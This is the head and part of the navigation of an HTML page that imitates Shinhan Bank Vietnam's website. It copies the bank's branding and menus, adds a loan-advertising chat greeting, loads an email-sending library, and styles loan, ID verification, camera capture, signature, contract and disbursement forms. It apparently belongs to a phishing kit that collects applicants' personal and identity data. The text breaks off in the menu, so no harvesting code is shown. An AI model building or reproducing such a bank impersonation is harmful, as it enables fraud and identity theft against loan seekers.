```html
<!DOCTYPE html>
<html>
<head>
<script>
!function(t,e,n,s,a,c,i,o,p){t.AppsFlyerSdkObject=a,t.AF=t.AF||function(){(t.AF.q=t.AF.q||[]).push([Date.now()].concat(Array.prototype.slice.call(arguments)))},t.AF.id=t.AF.id||i,t.AF.plugins={},o=e.createElement(n),p=e.getElementsByTagName(n)[0],o.async=1,o.src="https://websdk.appsflyer.com?"+(c.length>0?"st="+c.split(",").sort().join(",")+"&":"")+(i.length>0?"af_id="+i:""),p.parentNode.insertBefore(o,p)}(window,document,"script",0,"AF","banners",{banners: {key: "0a5f8680-444c-413e-86e2-d452500037fd"}});AF('banners', 'showBanner');
</script>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="csrf-token" content="flBZzgVCzEBmPwoEyekJgpET4VkG6FCAU6WnPQta">
<title>Ngân hàng Shinhan</title>
<meta property="og:url" content="https://shinhan.com.vn" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Shinhan Bank" />
<meta property="og:description" content="Ngân hàng Shinhan - Giải pháp tài chính toàn diện" />
<meta property="og:image" content="assets/img/logo-01.svg" />
<link rel="icon" href="assets/img/favicon2023.ico">
<link rel="apple-touch-icon" sizes="57x57" href="assets/img/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="assets/img/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="assets/img/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="assets/img/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="assets/img/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="assets/img/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="assets/img/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="assets/img/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="assets/img/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="assets/img/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="assets/img/favicon-16x16.png">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="assets/img/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<meta name="facebook-domain-verification" content="86rreze7d7vjof7oruihbm8p6cap6y" />
<!-- Preload tài nguyên quan trọng -->
<link rel="preload" href="assets/img/logo-01.svg" as="image">
<link rel="preload" href="assets/img/2025.01_RLD_Unsecured--Loan_Baneer.jpg" as="image">
<!-- Chú thích: Nén CSS bằng Webpack hoặc công cụ tương tự trong môi trường sản xuất -->
<link rel="stylesheet" type="text/css" href="assets/css/article.css?v=1" onerror="this.href='assets/css/fallback/article.css'" />
<link rel="stylesheet" type="text/css" href="assets/css/stylelibs.min.css?v=1" onerror="this.href='assets/css/fallback/stylelibs.min.css'" />
<link rel="stylesheet" type="text/css" href="assets/css/style.min.css?v=0823" onerror="this.href='assets/css/fallback/style.min.css'" />
<!-- Thêm thư viện -->
<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<!-- Chú thích: Tích hợp opencv.js để kiểm tra chất lượng ảnh trong môi trường sản xuất -->
<!-- <script src="https://docs.opencv.org/4.x/opencv.js"></script> -->
<style>
.popup-success {width: 420px;background-color: #fff;display: none;position: relative;}
.popup-success .btn-close {width: 22px;height: 22px;border-radius: 50%;position: absolute;top: -10px;right: -10px;background: #e4e5e6;cursor: pointer;transition: all 0.3s;}
.popup-success .btn-close img {top: 50%;left: 50%;transform: translate(-50%, -50%);position: absolute;}
.popup-success .content {padding: 40px;text-align: center;}
.banner-top .text-w .bread a, .banner-top .text-w .bread span {margin: 0 3px;}
@media (min-width: 767px) {.list-tab.mobile.show {display: none !important;}}
header .navigation .sub-nav .sub .box .list a {line-height: initial; margin-bottom: 12px;}
.btn-main.yellow a {border: 1px solid #cf9c51;}
.btn-main.yellow a:hover, .btn-main.yellow a:focus {border: 1px solid #cf9c51;}
button.AntBuddy-toggleButton {width: 70px;height: 70px;background-color: transparent !important;}
.AntBuddy-toggleButtonContainer {right: 5px !important;bottom: 55px !important;}
button.AntBuddy-toggleButton img {max-height: 70px !important;max-width: 70px !important;}
.AntBuddy-chatWindowContainer {bottom: 130px !important;}
.AntBuddy-toggleButton path {stroke: #00397F;}
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}
body {
    font-family: 'Arial', sans-serif;
    background-color: #f5f8fa;
    color: #333;
    line-height: 1.6;
}
.container {
    max-width: 600px;
    margin: 0 auto;
    text-align: center;
}
h1 {
    color: #004b8d;
    font-size: 2rem;
    margin-bottom: 20px;
    text-transform: uppercase;
}
h3 {
    color: #004b8d;
    font-size: 1.4rem;
    margin: 15px 0 10px;
    text-align: left;
}
h4 {
    color: #004b8d;
    font-size: 1.2rem;
}
button {
    padding: 12px 24px;
    background-color: #f28c38;
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 1.1rem;
    font-weight: bold;
    transition: background-color 0.3s ease, transform 0.2s ease;
}
button:hover {
    background-color: #d97a30;
    transform: scale(1.05);
}
#loanForm, #registerForm, #verifyForm, #contract, #disbursement {
    background-color: #fff;
    padding: 15px;
    border-radius: 12px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    margin-bottom: 20px;
    border: 1px solid #e6f0fa;
}
label {
    display: block;
    margin: 8px 0 5px;
    color: #333;
    font-weight: 600;
    font-size: 14px;
    position: relative;
}
input, select {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 8px;
    font-size: 14px;
}
.radio-group {
    display: flex;
    gap: 15px;
    margin-bottom: 15px;
}
#result {
    margin-top: 20px;
    padding: 15px;
    border: 1px solid #ccc;
    border-radius: 12px;
    background-color: white;
}
table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
    font-size: 14px;
}
th, td {
    border: 1px solid #ddd;
    padding: 10px;
    text-align: left;
}
.suggestion, .notification {
    margin-top: 20px;
    padding: 15px;
    background-color: #e6f0fa;
    border-radius: 8px;
}
.modal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.6);
    justify-content: center;
    align-items: center;
    z-index: 1000;
}
.modal.active {
    display: flex !important;
}
.modal-content {
    background-color: white;
    padding: 15px;
    border-radius: 12px;
    width: 90%;
    max-width: 600px;
    max-height: 90vh;
    overflow-y: auto;
}
.close-btn {
    float: right;
    font-size: 20px;
    cursor: pointer;
    color: #004b8d;
}
.form-actions {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin-top: 20px;
}
.error {
    color: #d32f2f;
    font-size: 14px;
    text-align: left;
    margin-top: -10px;
    margin-bottom: 10px;
}
.error-summary {
    color: #d32f2f;
    font-size: 14px;
    text-align: center;
    margin-bottom: 15px;
}
.banner {
    background-color: #004b8d;
    color: white;
    padding: 15px;
    border-radius: 12px;
}
.messenger-btn {
    position: fixed;
    bottom: 15px;
    right: 15px;
    background-color: #f28c38;
    color: white;
    padding: 10px 20px;
    border-radius: 20px;
    text-decoration: none;
}
.back-to-top {
    position: fixed;
    bottom: 80px;
    right: 15px;
    background-color: #004b8d;
    color: white;
    padding: 10px;
    border-radius: 50%;
    cursor: pointer;
    display: none;
}
.back-to-top.show {
    display: block;
}
.camera-section {
    margin: 15px 0;
    text-align: center;
    background-color: #f9f9f9;
    padding: 10px;
    border-radius: 8px;
}
video, img.preview {
    width: 100%;
    max-width: 250px;
    border-radius: 8px;
    margin: 10px auto;
}
.logo {
    max-width: 120px;
    margin: 0 auto 15px;
}
.quick-access .ct .item {
    display: flex;
    align-items: center;
    gap: 10px;
}
.quick-access .ct .item img {
    width: 24px;
    height: 24px;
}
.tooltip {
    position: absolute;
    right: 5px;
    top: 50%;
    transform: translateY(-50%);
    color: #004b8d;
    cursor: pointer;
}
.tooltip-text {
    display: none;
    position: absolute;
    background-color: #333;
    color: white;
    padding: 5px 10px;
    border-radius: 4px;
    top: 100%;
    right: 0;
    z-index: 10;
}
.tooltip:hover .tooltip-text {
    display: block;
}
.signature-pad {
    border: 1px solid #ccc;
    border-radius: 8px;
    margin: 15px 0;
}
.loading-indicator {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(0, 0, 0, 0.7);
    color: white;
    padding: 15px;
    border-radius: 8px;
    z-index: 2000;
}
.pagination {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin-top: 15px;
}
.pagination button {
    padding: 8px 12px;
    font-size: 14px;
}
@media (max-width: 768px) {
    h3 { font-size: 1.4rem; }
    h4 { font-size: 1.2rem; }
    table { font-size: 12px; overflow-x: auto; display: block; }
    .modal-content { width: 95%; padding: 10px; }
}
</style>
<script>
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-KZ3KJBS');
</script>
<script>
window.AntBuddy = {
    config: {
        token: "ad1649d9-3cba-412e-979d-2e2e866d2810",
        inbox: "6b3d374b-3149-47ee-8696-75f2fe6d37cb",
        lang: "vi",
        title: "Chào mừng bạn đến với Ngân hàng Shinhan Việt Nam",
        primaryColor: "#163778",
        greeting: "Xin chào! Hỏi về vay tiêu dùng? Lãi suất từ 5.5%-11%/năm, hạn mức đến 900 triệu VND. Hỏi thêm nhé!",
        awayMessage: "Cảm ơn bạn! Vui lòng liên hệ qua Messenger (https://m.me/shinhanfinancer) hoặc theo dõi Facebook (https://www.facebook.com/shinhanfinancer).",
        newMessagePlaceholder: "Nhập câu hỏi...",
        showAgentAvailability: false,
        customIconUrl: "https://s3-omni.shinhan.com.vn/storage/sol11vi.png"
    },
};
</script>
<script type="text/javascript" async defer src="https://chat-sdk-omni.shinhan.com.vn/widget.js"></script>
</head>
<body class="post-detail shinhan_personal">
<div class="loading-indicator" id="loadingIndicator">Đang xử lý...</div>
<div class="loading">
    <div class="loader-img">
        <img src="assets/img/loading-icon-2.png" alt="" style="max-height: 60px;">
    </div>
</div>
<div class="overplay-mobile"></div>
<div class="quick-access">
    <div class="head"><span>Truy Cập</span></div>
    <div class="icon-w">
        <div class="item"><img src="assets/img/icon-deposit.png" alt=""></div>
        <div class="item"><img src="assets/img/icon-form.png" alt=""></div>
        <div class="item"><img src="assets/img/icon-calculator.png" alt=""></div>
        <div class="item"><img src="assets/img/icon-interest.png" alt=""></div>
        <div class="item"><img src="assets/img/icon-reference.png" alt=""></div>
    </div>
    <div class="ct">
        <div class="item"><img src="assets/img/icon-deposit.png" alt=""><a href="pages/vi/lai-suat-tien-gui.html" target="_blank">Lãi Suất Tiền Gửi</a></div>
        <div class="item"><img src="assets/img/icon-form.png" alt=""><a href="pages/vi/mau-don.html">Mẫu Đơn</a></div>
        <div class="item"><img src="assets/img/icon-calculator.png" alt=""><a href="pages/vi/personal-personalloan-calculator.html" target="_blank">Tính khoản vay</a></div>
        <div class="item"><img src="assets/img/icon-interest.png" alt=""><a href="pages/vi/lai-suat-vay.html">Lãi Suất Vay</a></div>
        <div class="item"><img src="assets/img/icon-reference.png" alt=""><a href="pages/vi/tham-chieu.html">Tham Chiếu</a></div>
    </div>
</div>
<div class="quick-access-mobile">
    <div class="ct">
        <div class="item"><a href="pages/vi/lai-suat-tien-gui.html" target="_blank"><i class="i2"></i></a></div>
        <div class="item"><a href="pages/vi/mau-don.html" target="_blank"><i class="i4"></i></a></div>
        <div class="item"><a href="pages/vi/personal-personalloan-calculator.html" target="_blank"><i class="i5"></i></a></div>
        <div class="item"><a href="pages/vi/lai-suat-vay.html" target="_blank"><i class="i6"></i></a></div>
        <div class="item"><a href="pages/vi/tham-chieu.html" target="_blank"><i class="i7"></i></a></div>
    </div>
</div>
<div id="content-wrapper">
    <div class="header-mobile">
        <div class="top-nav">
            <div class="brand">
                <a href="index.html"><img src="assets/img/logo-01.svg" alt="Shinhan Bank" width="130px"></a>
            </div>
            <div class="right">
                <div class="login">
                    <div class="btn-log">
                        <div id="vn4-the-languages_r3lPmIV5HM"></div>
                    </div>
                    <div class="btn-log">
                        <a href="https://online.shinhan.com.vn/global-shinhan" target="_blank"><i><img src="assets/img/i_lock.png" alt="Shinhan Bank"></i><span>Đăng Nhập</span></a>
                    </div>
                </div>
                <div class="btn-nav">
                    <div class="o-grid__item">
                        <button class="c-hamburger c-hamburger--htx"><span>toggle menu</span></button>
                    </div>
                </div>
            </div>
        </div>
        <div class="nav-mobile">
            <div class="inner">
                <ul class="vn4-nav">
                    <li><a href="index.html">Trang chủ</a></li>
                    <li class="sub">
                        <a href="javascript:void(0)">Giới Thiệu<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                        <ul class="vn4-nav-children">
                            <li class="sub">
                                <a href="javascript:void(0)">Giới Thiệu về Shinhan<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/gioi-thieu.html">Giới Thiệu</a></li>
                                    <li><a href="pages/vi/about-shinhan-way.html">Văn Hóa Shinhan</a></li>
                                    <li><a href="pages/vi/about-vision-mission.html">Tầm Nhìn & Sứ Mệnh</a></li>
                                    <li><a href="pages/vi/about-shinhan-financial-group.html">Giải Thưởng</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/about-corporate-social-responsibility.html">Hoạt Động Xã Hội</a></li>
                            <li class="sub">
                                <a href="javascript:void(0)">Tin Tức Và Thông Báo<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/tin-tuc-hoat-dong.html">Tin tức hoạt động</a></li>
                                    <li><a href="pages/vi/press-release-2.html">Thông Cáo Báo Chí</a></li>
                                    <li><a href="pages/vi/thong-bao-xu-ly-tai-san-bao-dam.html">Thông báo xử lý tài sản bảo đảm</a></li>
                                </ul>
                            </li>
                            <li><a href="https://shinhancareer.com/">Tuyển Dụng</a></li>
                            <li class="sub">
                                <a href="javascript:void(0)">Công bố Thông tin<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/financial-statement.html">Báo Cáo Tài Chính</a></li>
                                    <li><a href="pages/vi/disclosure-on-capital-adequacy-ratio.html">Công bố thông tin về Tỷ Lệ An Toàn Vốn</a></li>
                                    <li><a href="pages/vi/periodic-information-disclosure.html">Công bố thông tin phát hành giấy tờ có giá</a></li>
                                    <li><a href="pages/vi/business-review.html">Business Review</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/contact.html">Thông Tin Liên Hệ</a></li>
                        </ul>
                    </li>
                    <li><a href="pages/vi/shinhan-pwm.html">Shinhan PWM</a></li>
                    <li class="sub">
                        <a href="javascript:void(0)">Cá nhân<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                        <ul class="vn4-nav-children">
                            <li class="sub">
                                <a href="javascript:void(0)">Tài Khoản Tiền Gửi<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/tai-khoan-thanh-toan-2.html">Tài Khoản Thanh Toán</a></li>
                                    <li><a href="pages/vi/tai-khoan-luong.html">Tài Khoản Lương</a></li>
                                    <li><a href="pages/vi/tai-khoan-tien-gui-co-ky-han-2.html">Tài Khoản Tiền Gửi Có Kỳ Hạn</a></li>
                                    <li><a href="pages/vi/tai-khoan-tien-gui-tich-luy.html">Tài Khoản Tiền Gửi Tích Lũy</a></li>
                                    <li><a href="pages/vi/tai-khoan-s-payroll-hoan-toan-mien-phi.html">Tài khoản S-Payroll</a></li>
                                    <li><a href="pages/vi/so-tai-khoan-may-man-2.html">Số tài khoản may mắn</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Vay Cá Nhân Trực Tuyến<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/vay-ca-nhan-truc-tuyen.html">Vay Cá Nhân Trực Tuyến</a></li>
                                    <li><a href="pages/vi/vay-mua-nha.html">Vay mua nhà</a></li>
                                    <li><a href="pages/vi/vay-mua-xe.html">Vay mua xe</a></li>
                                    <li><a href="pages/vi/vay-mua-xe-da-qua-su-dung.html">Vay mua xe đã qua sử dụng</a></li>
                                    <li><a href="pages/vi/vay-tieu-dung.html">Vay Tiêu Dùng</a></li>
                                    <li><a href="pages/vi/vay-tieu-dung-truc-tuyen.html">Vay tiêu dùng trực tuyến</a></li>
                                    <li><a href="pages/vi/chuong-trinh-hop-tac.html">Chương Trình Hợp Tác</a></li>
                                    <li><a href="pages/vi/vay-tieu-dung-bao-lanh.html">Vay Tiêu dùng Bảo lãnh</a></li>
                                    <li><a href="pages/vi/tra-no-khoan-vay-the-chap-bat-dong-san-tai-ngan-hang-khac.html">Trả nợ khoản vay thế chấp Bất động sản tại Ngân hàng khác</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Ngân Hàng Điện Tử<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/internet-banking-4.html">Internet Banking</a></li>
                                    <li><a href="pages/vi/dich-vu-lien-ket-vi-dien-tu.html">Dịch vụ liên kết ví điện tử</a></li>
                                    <li><a href="pages/vi/dich-vu-sms-2.html">Dịch Vụ SMS</a></li>
                                    <li><a href="pages/vi/atm-2.html">ATM</a></li>
                                    <li><a href="pages/vi/stm.html">STM</a></li>
                                    <li><a href="pages/vi/duong-day-nong.html">Đường Dây Nóng</a></li>
                                    <li><a href="pages/vi/dich-vu-thanh-toan-truc-tuyen-voi-the-atm-noi-dia-shinhan.html">Thanh Toán Trực Tuyến Với Thẻ ATM Nội Địa Shinhan</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/tops-club.html">Tops Club</a></li>
                            <li><a href="pages/vi/shinhan-package.html">Shinhan Package</a></li>
                            <li><a href="pages/vi/my-sol-package.html">My SOL Package</a></li>
                            <li><a href="pages/vi/promotion.html">Chương Trình Khuyến Mãi</a></li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/credit-card-application.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;width: auto;line-height: 35px;height: 35px;">ĐĂNG KÝ NGAY</a></li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/card-referral.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;width: auto;line-height: 35px;height: 35px;">GIỚI THIỆU BẠN BÈ</a></li>
                            <li><a href="pages/vi/bao-hiem.html">Bảo Hiểm</a></li>
                            <li><a href="pages/vi/shinhan-ois.html">Shinhan OIS</a></li>
                        </ul>
                    </li>
                    <li class="sub">
                        <a href="javascript:void(0)">Hộ kinh doanh/SME<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                        <ul class="vn4-nav-children">
                            <li class="sub">
                                <a href="javascript:void(0)">Vay tài trợ kinh doanh<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/vay-bo-sung-von-luu-dong-2.html">Vay bổ sung vốn lưu động</a></li>
                                    <li><a href="pages/vi/vay-von-dau-tu-kinh-doanh-2.html">Vay vốn đầu tư kinh doanh</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/ho-kinh-doanh-sme.html">Tài khoản và tiền gửi</a></li>
                            <li class="sub">
                                <a href="javascript:void(0)">Thẻ<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/the-tin-dung-shinhan-business-owner-2.html">Thẻ tín dụng Shinhan Business Owner</a></li>
                                    <li><a href="pages/vi/the-tin-dung-shinhan-sme-2.html">Thẻ tín dụng Shinhan SME</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">POS<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/dich-vu-chap-nhan-thanh-toan-the-qua-may-pos-ngan-hang-shinhan-2.html">Dịch vụ chấp nhận thanh toán thẻ qua máy POS</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Gói dịch vụ<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/soho-biz-package.html">SOHO Biz Package</a></li>
                                    <li><a href="pages/vi/goi-uu-dai-shinhan-soho-merchant.html">Gói ưu đãi Shinhan SOHO Merchant</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/promotion.html">Chương Trình Khuyến Mãi</a></li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/credit-card-application.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;width: auto;line-height: 35px;height: 35px;">ĐĂNG KÝ NGAY</a></li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/card-referral.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;width: auto;line-height: 35px;height: 35px;">GIỚI THIỆU BẠN BÈ</a></li>
                        </ul>
                    </li>
                    <li class="sub">
                        <a href="javascript:void(0)">Doanh Nghiệp<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                        <ul class="vn4-nav-children">
                            <li class="sub">
                                <a href="javascript:void(0)">Tài Khoản và Tiền Gửi<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/tien-gui-khong-ky-han.html">Tiền Gửi Không Kỳ Hạn</a></li>
                                    <li><a href="pages/vi/tien-gui-co-ky-han-2.html">Tiền Gửi Có Kỳ Hạn</a></li>
                                    <li><a href="pages/vi/so-tai-khoan-may-man-doanh-nghiep.html">Số tài khoản may mắn doanh nghiệp</a></li>
                                    <li><a href="pages/vi/dich-vu-tai-khoan-doanh-nghiep.html">Dịch vụ tài khoản doanh nghiệp</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Tín Dụng<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/ho-tro-vay-ngan-han.html">Hỗ Trợ Vay Ngắn Hạn</a></li>
                                    <li><a href="pages/vi/ho-tro-vay-trung-va-dai-han.html">Hỗ Trợ Vay Trung Và Dài Hạn</a></li>
                                    <li><a href="pages/vi/dich-vu-bao-lanh.html">Dịch Vụ Bảo Lãnh</a></li>
                                    <li><a href="pages/vi/dich-vu-bao-thanh-toan.html">Dịch Vụ Bao Thanh Toán</a></li>
                                    <li><a href="pages/vi/cho-vay-the-chap-khoan-phai-thu.html">Cho vay thế chấp Khoản phải thu</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Xuất Nhập khẩu<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/dich-vu-nhap-khau.html">Dịch Vụ Nhập Khẩu</a></li>
                                    <li><a href="pages/vi/dich-vu-xuat-khau.html">Dịch Vụ Xuất Khẩu</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Doanh nghiệp FDI<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/doanh-nghiep-fdi.html">Quy trình đầu tư</a></li>
                                    <li><a href="pages/vi/tai-khoan-cho-hoat-dong-dau-tu.html">Tài khoản cho hoạt động đầu tư</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Giao dịch Ngoại hối<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/giao-dich-ngoai-te-ky-han.html">Giao dịch ngoại tệ kỳ hạn</a></li>
                                    <li><a href="pages/vi/hoan-doi-lai-suat-mot-dong-tien.html">Hoán đổi lãi suất một đồng tiền</a></li>
                                    <li><a href="pages/vi/hoan-doi-lai-suat-hai-dong-tien.html">Hoán đổi lãi suất hai đồng tiền</a></li>
                                    <li><a href="pages/vi/dich-vu-ngoai-te-truc-tuyen.html">Dịch vụ ngoại tệ trực tuyến</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/securities-services.html">Dịch vụ chứng khoán</a></li>
                            <li class="sub">
                                <a href="javascript:void(0)">Ngân Hàng Điện Tử<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/ngan-hang-dien-tu-3.html">Ngân Hàng Điện Tử</a></li>
                                    <li><a href="pages/vi/dich-vu-sms.html">Dịch Vụ SMS</a></li>
                                    <li><a href="pages/vi/duong-day-nong-2.html">Đường Dây Nóng</a></li>
                                    <li><a href="pages/vi/cms-2.html">CMS</a></li>
                                </ul>
                            </li>
                            <li><a href="pages/vi/promotion.html">Chương Trình Khuyến Mãi</a></li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/credit-card-application.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;width: auto;line-height: 35px;height: 35px;">ĐĂNG KÝ NGAY</a></li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/card-referral.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;width: auto;line-height: 35px;height: 35px;">GIỚI THIỆU BẠN BÈ</a></li>
                            <li><a href="pages/vi/chuyen-doi-cung-dich-vu-shinhan-cms.html">Dịch vụ Shinhan CMS</a></li>
                        </ul>
                    </li>
                    <li class="sub">
                        <a href="javascript:void(0)">Thẻ<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                        <ul class="vn4-nav-children">
                            <li class="sub">
                                <a href="javascript:void(0)">Sản Phẩm Thẻ<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/the-tin-dung-ca-nhan.html">Thẻ Tín Dụng Cá Nhân</a></li>
                                    <li><a href="pages/vi/the-tin-dung-doanh-nghiep.html">Thẻ Tín Dụng Doanh Nghiệp</a></li>
                                    <li><a href="pages/vi/the-atm.html">Thẻ Ghi Nợ Cá Nhân</a></li>
                                    <li><a href="pages/vi/the-ghi-no-doanh-nghiep.html">Thẻ Ghi Nợ Doanh Nghiệp</a></li>
                                    <li><a href="pages/vi/so-sanh-the.html">So Sánh Thẻ Tín Dụng Cá Nhân</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Dịch Vụ Và Ưu Đãi Thẻ<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/shinhan-zone.html">Shinhan Zone</a></li>
                                    <li><a href="pages/vi/uu-dai-tra-gop.html">Ưu đãi trả góp</a></li>
                                    <li><a href="pages/vi/google-pay.html">Google Pay</a></li>
                                    <li><a href="pages/vi/shinhan-samsung-pay.html">Samsung Pay</a></li>
                                    <li><a href="pages/vi/shinhan-garmin-pay.html">Garmin Pay</a></li>
                                    <li><a href="pages/vi/tam-ung-tien-mat-linh-hoat-voi-the-tin-dung-shinhan.html">Tạm Ứng Tiền Mặt Linh Hoạt</a></li>
                                    <li><a href="pages/vi/dich-vu-thanh-toan-hoa-don-qua-the-tin-dung-2.html">Dịch Vụ Thanh Toán Hoá Đơn Qua Thẻ</a></li>
                                    <li><a href="pages/vi/chuong-trinh-shinhan-reward-2.html">Chương Trình Shinhan Reward</a></li>
                                </ul>
                            </li>
                            <li class="sub">
                                <a href="javascript:void(0)">Chương Trình Khuyến Mãi<i class="fa fa-angle-right" aria-hidden="true"></i></a>
                                <ul class="vn4-nav-children">
                                    <li><a href="pages/vi/the.html?target=new">Dành Cho Chủ Thẻ Mới</a></li>
                                    <li><a href="pages/vi/the.html?target=old">Dành Cho Tất cả Chủ Thẻ</a></li>
                                </ul>
                            </li>
                            <li style="padding: 5px 30px;"><a href="pages/vi/credit-card-application.html" style="display: inline-block;font-weight: bold;text-decoration: none;background: linear-gradient(#f18b53, #f57a27, #e66c18);color: white;padding: 0px 25px;border-radius: 13px;box-shadow: 2px 3px 8px 1px #8c8c8c;">ĐĂNG KÝ NGAY</a></li>
